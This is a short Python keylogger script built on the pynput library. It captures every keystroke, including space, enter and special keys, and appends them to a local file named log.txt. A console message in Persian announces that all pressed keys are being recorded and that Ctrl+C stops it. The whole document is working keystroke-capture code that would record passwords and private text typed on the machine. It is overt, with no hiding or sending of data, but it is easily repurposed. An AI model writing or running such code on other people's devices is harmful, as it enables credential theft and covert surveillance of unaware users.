import os
from datetime import datetime
from pynput import keyboard

LOG_FILE = "log.txt"

def on_press(key):
    try:
        char = key.char
    except AttributeError:
        if key == keyboard.Key.space:
            char = " "
        elif key == keyboard.Key.enter:
            char = "\n"
        else:
            char = f"[{key}]"
    
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(char)

print("🔍 در حال ضبط هر کلید فشرده شده... (برای توقف Ctrl+C)")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
